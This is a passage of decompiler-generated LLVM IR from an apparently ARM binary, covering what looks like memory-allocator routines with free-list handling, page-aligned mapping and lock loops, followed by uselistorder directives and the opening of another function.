  %v2_140ac = inttoptr i32 %v1_140ac to i32*
  %v3_140ac = load i32, i32* %v2_140ac, align 4
  store i32 %v3_140ac, i32* %r3.global-to-local, align 4
  store i32 %v0_1406c, i32* %r2.global-to-local, align 4
  %v1_140b4 = and i32 %v3_140ac, -2
  store i32 %v1_140b4, i32* @r7, align 4
  %v2_140b8 = sub i32 %v1_140b4, %v0_1406c
  store i32 %v2_140b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %dec_label_pc_141c0, %dec_label_pc_140ac
  %v0_140bc = phi i32 [ %v2_141cc, %dec_label_pc_141c0 ], [ %v2_140b8, %dec_label_pc_140ac ]
  %v3_140bc = udiv i32 %v0_140bc, 16
  store i32 %v3_140bc, i32* %r3.global-to-local, align 4
  %v1_140c0 = add nsw i32 %v3_140bc, -1
  store i32 %v1_140c0, i32* @r0, align 4
  %tmp82 = icmp ult i32 %v1_140c0, 33
  br i1 %tmp82, label %dec_label_pc_140ec, label %dec_label_pc_140cc

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140bc
  %tmp83 = icmp ugt i32 %v1_140c0, 7168
  br i1 %tmp83, label %.thread45, label %dec_label_pc_140d8

.thread45:                                        ; preds = %dec_label_pc_140cc
  store i32 63, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140e4

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140cc
  %v0_140d8 = call i32 @function_17570()
  %v3_140dc = udiv i32 %v0_140d8, 2097152
  %v1_140e0 = add nsw i32 %v3_140dc, -496
  store i32 %v1_140e0, i32* %r0.global-to-local, align 4
  %v0_140e4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_140e4

dec_label_pc_140e4:                               ; preds = %.thread45, %dec_label_pc_140d8
  %v1_140e4 = phi i32 [ %v1_140e0, %dec_label_pc_140d8 ], [ 63, %.thread45 ]
  %v0_140e4 = phi i32 [ %v0_140e4.pre, %dec_label_pc_140d8 ], [ %v0_14098, %.thread45 ]
  %v9_140e4 = icmp eq i32 %v0_140e4, %v1_140e4
  br i1 %v9_140e4, label %dec_label_pc_14260, label %dec_label_pc_140e4.dec_label_pc_140ec_crit_edge

dec_label_pc_140e4.dec_label_pc_140ec_crit_edge:  ; preds = %dec_label_pc_140e4
  %v0_140ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140e4.dec_label_pc_140ec_crit_edge, %dec_label_pc_141b8, %dec_label_pc_141c0, %dec_label_pc_140bc, %dec_label_pc_14098
  %v1_14204 = phi i32 [ %v0_140e4, %dec_label_pc_140e4.dec_label_pc_140ec_crit_edge ], [ %v0_14098, %dec_label_pc_141b8 ], [ 63, %dec_label_pc_141c0 ], [ %v0_14098, %dec_label_pc_140bc ], [ %v0_14098, %dec_label_pc_14098 ]
  %v0_140ec = phi i32 [ %v0_140ec.pre, %dec_label_pc_140e4.dec_label_pc_140ec_crit_edge ], [ %v7_13d74, %dec_label_pc_141b8 ], [ %v7_13d74, %dec_label_pc_141c0 ], [ %v7_13d74, %dec_label_pc_140bc ], [ %v7_13d74, %dec_label_pc_14098 ]
  %v1_140ec = add i32 %v0_140ec, 8
  store i32 %v1_140ec, i32* %r3.global-to-local, align 4
  %v1_140f0 = inttoptr i32 %v1_140ec to i32*
  %v2_140f0 = load i32, i32* %v1_140f0, align 4
  store i32 %v2_140f0, i32* %r3.global-to-local, align 4
  %v3_140f0 = add i32 %v0_140ec, 12
  %v4_140f0 = inttoptr i32 %v3_140f0 to i32*
  %v5_140f0 = load i32, i32* %v4_140f0, align 4
  store i32 %v5_140f0, i32* %ip.global-to-local, align 4
  %v9_140f4 = icmp eq i32 %v5_140f0, %v2_140f0
  br i1 %v9_140f4, label %dec_label_pc_141f0, label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140ec, %dec_label_pc_14254
  %v1_14104 = phi i32 [ %v5_140f0, %dec_label_pc_140ec ], [ %v5_14258, %dec_label_pc_14254 ]
  %v0_14104 = phi i32 [ %v2_140f0, %dec_label_pc_140ec ], [ %v2_14258, %dec_label_pc_14254 ]
  %v0_140fc = phi i32 [ %v0_140ec, %dec_label_pc_140ec ], [ %v0_14254, %dec_label_pc_14254 ]
  %v1_140fc = add i32 %v0_140fc, 4
  %v2_140fc = inttoptr i32 %v1_140fc to i32*
  %v3_140fc = load i32, i32* %v2_140fc, align 4
  %v1_14100 = or i32 %v3_140fc, 1
  store i32 %v1_14100, i32* %r2.global-to-local, align 4
  %v2_14104 = add i32 %v1_14104, 8
  %v3_14104 = inttoptr i32 %v2_14104 to i32*
  store i32 %v0_14104, i32* %v3_14104, align 4
  %v0_14108 = load i32, i32* %r2.global-to-local, align 4
  %v1_14108 = and i32 %v0_14108, -2
  store i32 %v1_14108, i32* @r0, align 4
  %v1_1410c = load i32, i32* @r5, align 4
  %v2_1410c = add i32 %v1_1410c, %v1_14108
  %v3_1410c = inttoptr i32 %v2_1410c to i32*
  %v4_1410c = load i32, i32* %v3_1410c, align 4
  store i32 %v4_1410c, i32* %r3.global-to-local, align 4
  %v1_14110 = add i32 %v1_1410c, 8
  %v2_14110 = inttoptr i32 %v1_14110 to i32*
  %v3_14110 = load i32, i32* %v2_14110, align 4
  store i32 %v3_14110, i32* %r1.global-to-local, align 4
  %v1_14114 = or i32 %v4_1410c, 1
  store i32 %v1_14114, i32* %r3.global-to-local, align 4
  %v0_14118 = load i32, i32* %ip.global-to-local, align 4
  %v2_14118 = add i32 %v3_14110, 12
  %v3_14118 = inttoptr i32 %v2_14118 to i32*
  store i32 %v0_14118, i32* %v3_14118, align 4
  %v0_1411c = load i32, i32* %r3.global-to-local, align 4
  %v1_1411c = load i32, i32* @r0, align 4
  %v2_1411c = load i32, i32* @r5, align 4
  %v3_1411c = add i32 %v2_1411c, %v1_1411c
  %v4_1411c = inttoptr i32 %v3_1411c to i32*
  store i32 %v0_1411c, i32* %v4_1411c, align 4
  %v0_14120 = load i32, i32* %r2.global-to-local, align 4
  %v1_14120 = load i32, i32* @r5, align 4
  %v2_14120 = add i32 %v1_14120, 4
  %v3_14120 = inttoptr i32 %v2_14120 to i32*
  store i32 %v0_14120, i32* %v3_14120, align 4
  %v0_14124 = load i32, i32* @r5, align 4
  store i32 %v0_14124, i32* @r8, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_14260, %dec_label_pc_140fc
  %v0_14128 = load i32, i32* @r6, align 4
  %v1_14128 = add i32 %v0_14128, 8
  store i32 %v1_14128, i32* %r2.global-to-local, align 4
  %v1_1412c = load i32, i32* @sl, align 4
  %v2_1412c = add i32 %v1_1412c, %v1_14128
  %v3_1412c = inttoptr i32 %v2_1412c to i32*
  %v4_1412c = load i32, i32* %v3_1412c, align 4
  store i32 %v4_1412c, i32* %r3.global-to-local, align 4
  %v2_14130 = icmp eq i32 %v4_1412c, 0
  store i1 %v2_14130, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1412c, i32* @r4, align 4
  br i1 %v2_14130, label %dec_label_pc_13f08, label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %dec_label_pc_14128
  %v0_14140 = call i32 @function_15c98()
  store i32 %v0_14140, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14148 = load i32, i32* %r2.global-to-local, align 4
  %v2_14148 = load i32, i32* %r1.global-to-local, align 4
  %v3_14148 = add i32 %v2_14148, %v1_14148
  %v4_14148 = inttoptr i32 %v3_14148 to i32*
  store i32 0, i32* %v4_14148, align 4
  %v0_1414c = call i32 @function_15c98()
  store i32 %v0_1414c, i32* %r0.global-to-local, align 4
  %v0_14150 = load i32, i32* @r6, align 4
  %v1_14150 = add i32 %v0_14150, 12
  store i32 %v1_14150, i32* %r3.global-to-local, align 4
  %v1_14154 = load i32, i32* %r1.global-to-local, align 4
  %v2_14154 = add i32 %v1_14154, %v1_14150
  %v3_14154 = inttoptr i32 %v2_14154 to i32*
  %v4_14154 = load i32, i32* %v3_14154, align 4
  store i32 %v4_14154, i32* %r2.global-to-local, align 4
  %v2_14158 = icmp eq i32 %v4_14154, 0
  br i1 %v2_14158, label %dec_label_pc_13f08, label %dec_label_pc_14160

dec_label_pc_14160:                               ; preds = %dec_label_pc_14140
  store i32 240, i32* @r7, align 4
  %v0_14164 = load i32, i32* @r4, align 4
  store i32 %v0_14164, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_14178 = icmp eq i32 %v0_14164, -38
  br i1 %v4_14178, label %dec_label_pc_1417c, label %dec_label_pc_13f08

dec_label_pc_1417c:                               ; preds = %dec_label_pc_14160
  store i32 -38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13f08

dec_label_pc_1418c:                               ; preds = %dec_label_pc_13ea8
  store i32 240, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  %v0_14198 = load i32, i32* @r4, align 4
  store i32 %v0_14198, i32* %r2.global-to-local, align 4
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32 -38), label %dec_label_pc_13ec4, label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %dec_label_pc_1418c
  store i32 %v0_14198, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ec4

dec_label_pc_141b8:                               ; preds = %dec_label_pc_140a0
  %v7_141b8 = icmp eq i32 %v0_14098, 63
  br i1 %v7_141b8, label %dec_label_pc_141c0, label %dec_label_pc_140ec

dec_label_pc_141c0:                               ; preds = %dec_label_pc_141b8
  %v1_141c0 = add i32 %v7_13d74, 4
  %v2_141c0 = inttoptr i32 %v1_141c0 to i32*
  %v3_141c0 = load i32, i32* %v2_141c0, align 4
  store i32 %v3_141c0, i32* %r3.global-to-local, align 4
  store i32 %v0_1406c, i32* %r1.global-to-local, align 4
  %v1_141c8 = and i32 %v3_141c0, -2
  store i32 %v1_141c8, i32* @r7, align 4
  %v2_141cc = sub i32 %v1_141c8, %v0_1406c
  store i32 %v2_141cc, i32* %r4.global-to-local, align 4
  %tmp84 = icmp ult i32 %v2_141cc, 114689
  br i1 %tmp84, label %dec_label_pc_140ec, label %dec_label_pc_140bc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_13e44
  %v2_141dc = load i32, i32* @global_var_223ac.578, align 4
  store i32 %v2_141dc, i32* @r3, align 4
  %v2_141e0 = icmp eq i32 %v2_141dc, 0
  store i1 %v2_141e0, i1* @cpsr_z, align 1
  br i1 %v2_141e0, label %dec_label_pc_141e8, label %dec_label_pc_14314

dec_label_pc_141e8:                               ; preds = %.thread14, %dec_label_pc_141dc, %dec_label_pc_1432c, %dec_label_pc_14314
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_13f24

dec_label_pc_141f0:                               ; preds = %dec_label_pc_140ec
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_141f4 = sub i32 32, %v1_14204
  store i32 %v1_141f4, i32* %r1.global-to-local, align 4
  %v7_141fc = lshr i32 1, %v1_141f4
  store i32 %v7_141fc, i32* %r4.global-to-local, align 4
  %v1_14200 = add i32 %v1_14204, -32
  store i32 %v1_14200, i32* %r0.global-to-local, align 4
  %v6_14200 = icmp slt i32 %v1_14200, 0
  %v7_14200 = icmp eq i32 %v1_14204, 32
  store i1 %v7_14200, i1* @cpsr_z, align 1
  %v6_14204 = shl i32 1, %v1_14204
  store i32 %v6_14204, i32* %r3.global-to-local, align 4
  br i1 %v6_14200, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_141f0
  %v7_14208 = shl i32 1, %v1_14200
  store i32 %v7_14208, i32* %r4.global-to-local, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_141f0, %bb66
  %v0_14214 = phi i32 [ %v7_141fc, %dec_label_pc_141f0 ], [ %v7_14208, %bb66 ]
  %v1_1420c = sub i32 -1, %v6_14204
  store i32 %v1_1420c, i32* @r7, align 4
  %v1_14214 = sub i32 -1, %v0_14214
  store i32 %v1_14214, i32* @r8, align 4
  store i32 %v1_1420c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %dec_label_pc_1421c.dec_label_pc_1421c_crit_edge, %bb67
  %v1_14224 = phi i32 [ %v1_14224.pre, %dec_label_pc_1421c.dec_label_pc_1421c_crit_edge ], [ %v1_1420c, %bb67 ]
  %v2_1421c = load i32, i32* @global_var_223b8.560, align 4
  store i32 %v2_1421c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v2_14224 = and i32 %v2_1421c, %v1_14224
  store i32 %v2_14224, i32* %r1.global-to-local, align 4
  %v4_14228 = call i32 @function_15cec(i32 %v2_1421c, i32 %v2_14224, i32* nonnull @global_var_223b8.560)
  store i32 %v4_14228, i32* %r0.global-to-local, align 4
  %v2_1422c = icmp eq i32 %v4_14228, 0
  store i1 %v2_1422c, i1* @cpsr_z, align 1
  br i1 %v2_1422c, label %dec_label_pc_14234, label %dec_label_pc_1421c.dec_label_pc_1421c_crit_edge

dec_label_pc_1421c.dec_label_pc_1421c_crit_edge:  ; preds = %dec_label_pc_1421c
  %v1_14224.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_14234:                               ; preds = %dec_label_pc_1421c
  store i32 ptrtoint (i32* @global_var_223bc.562 to i32), i32* @sb, align 4
  %v0_14238 = load i32, i32* @r8, align 4
  store i32 %v0_14238, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1423c

dec_label_pc_1423c:                               ; preds = %dec_label_pc_1423c.dec_label_pc_1423c_crit_edge, %dec_label_pc_14234
  %v1_14244 = phi i32 [ %v1_14244.pre, %dec_label_pc_1423c.dec_label_pc_1423c_crit_edge ], [ %v0_14238, %dec_label_pc_14234 ]
  %v2_1423c = load i32, i32* @global_var_223bc.562, align 4
  store i32 %v2_1423c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223bc.562 to i32), i32* %r2.global-to-local, align 4
  %v2_14244 = and i32 %v2_1423c, %v1_14244
  store i32 %v2_14244, i32* %r1.global-to-local, align 4
  %v4_14248 = call i32 @function_15cec(i32 %v2_1423c, i32 %v2_14244, i32* nonnull @global_var_223bc.562)
  store i32 %v4_14248, i32* %r0.global-to-local, align 4
  %v2_1424c = icmp eq i32 %v4_14248, 0
  store i1 %v2_1424c, i1* @cpsr_z, align 1
  br i1 %v2_1424c, label %dec_label_pc_14254, label %dec_label_pc_1423c.dec_label_pc_1423c_crit_edge

dec_label_pc_1423c.dec_label_pc_1423c_crit_edge:  ; preds = %dec_label_pc_1423c
  %v1_14244.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1423c

dec_label_pc_14254:                               ; preds = %dec_label_pc_1423c
  %v0_14254 = load i32, i32* @r5, align 4
  %v1_14254 = add i32 %v0_14254, 8
  store i32 %v1_14254, i32* %r3.global-to-local, align 4
  %v1_14258 = inttoptr i32 %v1_14254 to i32*
  %v2_14258 = load i32, i32* %v1_14258, align 4
  store i32 %v2_14258, i32* %r3.global-to-local, align 4
  %v3_14258 = add i32 %v0_14254, 12
  %v4_14258 = inttoptr i32 %v3_14258 to i32*
  %v5_14258 = load i32, i32* %v4_14258, align 4
  store i32 %v5_14258, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_140fc

dec_label_pc_14260:                               ; preds = %dec_label_pc_140e4
  store i32 %v0_1406c, i32* %ip.global-to-local, align 4
  %v0_14264 = load i32, i32* @r5, align 4
  %v1_14264 = add i32 %v0_14264, 12
  %v2_14264 = inttoptr i32 %v1_14264 to i32*
  %v3_14264 = load i32, i32* %v2_14264, align 4
  store i32 %v3_14264, i32* @r0, align 4
  %v1_14268 = add i32 %v0_14264, 8
  %v2_14268 = inttoptr i32 %v1_14268 to i32*
  %v3_14268 = load i32, i32* %v2_14268, align 4
  store i32 %v3_14268, i32* %r2.global-to-local, align 4
  %v2_1426c = add i32 %v0_14264, %v0_1406c
  store i32 %v2_1426c, i32* %r3.global-to-local, align 4
  %v2_14270 = add i32 %v2_1426c, 8
  %v3_14270 = inttoptr i32 %v2_14270 to i32*
  store i32 %v3_14268, i32* %v3_14270, align 4
  %v0_14274 = load i32, i32* %r3.global-to-local, align 4
  %v1_14274 = load i32, i32* @r0, align 4
  %v2_14274 = add i32 %v1_14274, 8
  %v3_14274 = inttoptr i32 %v2_14274 to i32*
  store i32 %v0_14274, i32* %v3_14274, align 4
  %v0_14278 = load i32, i32* %r3.global-to-local, align 4
  %v1_14278 = add i32 %v0_14278, 8
  %v2_14278 = inttoptr i32 %v1_14278 to i32*
  %v3_14278 = load i32, i32* %v2_14278, align 4
  store i32 %v3_14278, i32* %r1.global-to-local, align 4
  %v0_1427c = load i32, i32* %ip.global-to-local, align 4
  %v1_1427c = or i32 %v0_1427c, 1
  store i32 %v1_1427c, i32* %r2.global-to-local, align 4
  %v0_14280 = load i32, i32* @r5, align 4
  store i32 %v0_14280, i32* @r8, align 4
  %v0_14284 = load i32, i32* %r4.global-to-local, align 4
  %v2_14284 = add i32 %v0_14278, 4
  %v3_14284 = inttoptr i32 %v2_14284 to i32*
  store i32 %v0_14284, i32* %v3_14284, align 4
  %v0_14288 = load i32, i32* @r0, align 4
  %v1_14288 = load i32, i32* %r3.global-to-local, align 4
  %v2_14288 = add i32 %v1_14288, 12
  %v3_14288 = inttoptr i32 %v2_14288 to i32*
  store i32 %v0_14288, i32* %v3_14288, align 4
  %v0_1428c = load i32, i32* %r2.global-to-local, align 4
  %v1_1428c = load i32, i32* @r5, align 4
  %v2_1428c = load i32, i32* %ip.global-to-local, align 4
  %v3_1428c = add i32 %v2_1428c, %v1_1428c
  %v4_1428c = inttoptr i32 %v3_1428c to i32*
  store i32 %v0_1428c, i32* %v4_1428c, align 4
  %v0_14290 = load i32, i32* %r2.global-to-local, align 4
  %v1_14290 = load i32, i32* @r5, align 4
  %v2_14290 = add i32 %v1_14290, 4
  %v3_14290 = inttoptr i32 %v2_14290 to i32*
  store i32 %v0_14290, i32* %v3_14290, align 4
  %v0_14294 = load i32, i32* %r3.global-to-local, align 4
  %v1_14294 = load i32, i32* %r1.global-to-local, align 4
  %v2_14294 = add i32 %v1_14294, 12
  %v3_14294 = inttoptr i32 %v2_14294 to i32*
  store i32 %v0_14294, i32* %v3_14294, align 4
  %v0_14298 = load i32, i32* %r4.global-to-local, align 4
  %v1_14298 = load i32, i32* @r7, align 4
  %v2_14298 = load i32, i32* @r5, align 4
  %v3_14298 = add i32 %v2_14298, %v1_14298
  %v4_14298 = inttoptr i32 %v3_14298 to i32*
  store i32 %v0_14298, i32* %v4_14298, align 4
  br label %dec_label_pc_14128

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14028
  %v1_142a4 = add i32 %v1_1402c, 4103
  %v1_142ac = and i32 %v1_142a4, -4096
  store i32 %v1_142ac, i32* @r6, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 %v1_142ac, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v7_142d8 = call i32 @function_145f8(i32 0, i32 %v1_142ac, i32 3, i32 34, i32 -1, i32 0, i32 0)
  store i32 %v7_142d8, i32* %r0.global-to-local, align 4
  %v3_142dc = icmp eq i32 %v7_142d8, -1
  %v8_142dc = icmp eq i32 %v7_142d8, -1
  br i1 %v8_142dc, label %.thread14, label %bb68

bb68:                                             ; preds = %dec_label_pc_142a0
  %v2_142e0 = add i32 %v7_142d8, 8
  store i32 %v2_142e0, i32* @r3, align 4
  %v1_142e4 = load i32, i32* @r6, align 4
  %v2_142e4 = add i32 %v1_142e4, -8
  store i32 %v2_142e4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_142ec = add i32 %v7_142d8, 16
  store i32 %v2_142ec, i32* @ip, align 4
  %v4_142f0 = inttoptr i32 %v2_142e0 to i32*
  store i32 8, i32* %v4_142f0, align 4
  %v1_142f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_142f4 = load i32, i32* @r3, align 4
  %v3_142f4 = add i32 %v2_142f4, 4
  %v4_142f4 = inttoptr i32 %v3_142f4 to i32*
  store i32 %v1_142f4, i32* %v4_142f4, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_142a0, %bb68
  br i1 %v3_142dc, label %dec_label_pc_141e8, label %dec_label_pc_13f24

dec_label_pc_14300:                               ; preds = %dec_label_pc_13c98
  %v0_14300 = call i32 @function_12ecc()
  store i32 %v0_14300, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* @ip, align 4
  %v2_1430c = inttoptr i32 %v0_14300 to i32*
  store i32 12, i32* %v2_1430c, align 4
  br label %dec_label_pc_13f24

dec_label_pc_14314:                               ; preds = %dec_label_pc_141dc
  %v0_14314 = call i32 @function_15c98()
  store i32 %v0_14314, i32* @r0, align 4
  %v0_14318 = load i32, i32* %r4.global-to-local, align 4
  %v1_14318 = load i32, i32* @r6, align 4
  %v2_14318 = inttoptr i32 %v1_14318 to i32*
  store i32 %v0_14318, i32* %v2_14318, align 4
  %v0_1431c = call i32 @function_15c98()
  store i32 %v0_1431c, i32* %r0.global-to-local, align 4
  %v3_14320 = load i32, i32* @global_var_223b0.581, align 4
  store i32 %v3_14320, i32* @r3, align 4
  %v2_14324 = icmp eq i32 %v3_14320, 0
  br i1 %v2_14324, label %dec_label_pc_141e8, label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %dec_label_pc_14314
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32 -38), label %dec_label_pc_141e8, label %dec_label_pc_14348

dec_label_pc_14348:                               ; preds = %dec_label_pc_1432c
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_14354 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14354, i32* @ip, align 4
  br label %dec_label_pc_13f24

; uselistorder directives
  uselistorder i32 %v7_142d8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_14258, { 1, 0 }
  uselistorder i32 %v2_14258, { 1, 0 }
  uselistorder i32 %v0_14254, { 1, 2, 0 }
  uselistorder i32 %v2_1423c, { 1, 0, 2 }
  uselistorder i32 %v2_1421c, { 1, 0, 2 }
  uselistorder i32 %v1_1420c, { 2, 1, 0 }
  uselistorder i32 %v1_14200, { 0, 2, 1 }
  uselistorder i32 %v2_141cc, { 0, 2, 1 }
  uselistorder i32 %v1_1410c, { 1, 0 }
  uselistorder i32 %v0_140ec, { 0, 2, 1 }
  uselistorder i32 %v3_140bc, { 1, 0 }
  uselistorder i32 %v2_140a4, { 1, 0 }
  uselistorder i32 %v1_140a0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_14060, { 1, 0 }
  uselistorder i32 %v3_1405c, { 1, 0 }
  uselistorder i32 %v1_14040, { 2, 0, 3, 1 }
  uselistorder i32 %v3_1403c, { 1, 0 }
  uselistorder i32 %v1_1402c, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_13f5c, { 1, 0 }
  uselistorder i32 %v1_13ed0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13e88, { 1, 0, 2 }
  uselistorder i32 %v2_13e48, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v2_13e1c, { 0, 2, 1 }
  uselistorder i32 %v2_13e18, { 0, 2, 1 }
  uselistorder i32 %v4_13d80, { 1, 0 }
  uselistorder i32 %v7_13d74, { 5, 0, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i32 %v4_13d74, { 0, 2, 1 }
  uselistorder i32 %v0_14098, { 5, 8, 7, 6, 9, 3, 11, 4, 0, 10, 2, 1, 12 }
  uselistorder i32 %v1_13d68, { 0, 2, 1 }
  uselistorder i32 %v3_13d5c, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v0_13f7c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13d04, { 1, 0 }
  uselistorder i32 %v6_13ccc, { 1, 2, 0 }
  uselistorder i32 %v1_13cc8, { 1, 2, 0 }
  uselistorder i32 %v0_1406c, { 0, 7, 6, 5, 9, 8, 2, 1, 3, 10, 12, 11, 4, 13 }
  uselistorder i32 %v1_13cc4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 12, 13, 7, 8, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 14, 15, 16, 17, 18 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 46 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 26, 20, 22, 21, 23, 25, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 9, 8, 16, 10, 11, 12, 13, 15, 14, 17, 18, 19, 1, 20, 21, 22, 23, 25, 24, 30, 28, 27, 26, 29, 35, 33, 32, 31, 34, 0, 36, 37, 38, 40, 39, 41, 42, 43 }
  uselistorder i32 38, { 3, 4, 5, 8, 6, 7, 0, 9, 1, 10, 2, 11 }
  uselistorder i32 ()* @function_17570, { 4, 1, 2, 3, 0 }
  uselistorder i32 (i32*)* @function_13260, { 1, 0 }
  uselistorder i32* @global_var_223ac.578, { 3, 1, 4, 2, 5, 0, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_223ac.578 to i32), { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8), { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 134217728, { 0, 1, 4, 2, 3 }
  uselistorder i32 124511785, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19f86.576 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_223bc.562, { 1, 5, 6, 7, 0, 2, 8, 9, 3, 10, 4, 12, 11 }
  uselistorder i32* @global_var_223b8.560, { 3, 7, 8, 9, 0, 4, 2, 1, 10, 5, 11, 6, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_223b8.560 to i32), { 23, 24, 25, 10, 3, 26, 27, 4, 28, 18, 12, 29, 20, 30, 31, 32, 2, 33, 21, 34, 11, 35, 13, 22, 36, 5, 37, 38, 39, 0, 14, 6, 40, 15, 7, 41, 42, 43, 1, 16, 19, 8, 44, 17, 9, 45 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_141e8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_140fc, { 1, 0 }
  uselistorder label %dec_label_pc_140ec, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_140e4, { 1, 0 }
  uselistorder label %dec_label_pc_13f54, { 1, 0 }
  uselistorder label %dec_label_pc_13f24, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_13f20, { 1, 0 }
  uselistorder label %dec_label_pc_13f08, { 4, 1, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_13ec4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13e7c, { 1, 0 }
  uselistorder label %dec_label_pc_13e28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13dac, { 1, 0 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
  uselistorder label %dec_label_pc_13cfc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13ce0.loopexit, { 2, 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_13cac, { 2, 0, 1 }
}

define i32 @function_14374(i32 %arg1) local_unnamed_addr {
dec_label_pc_14374:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1437c = call i32 @function_13c7c()
  %v2_14380 = icmp eq i32 %v0_1437c, 0
  br i1 %v2_14380, label %dec_label_pc_143c0, label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %dec_label_pc_14374
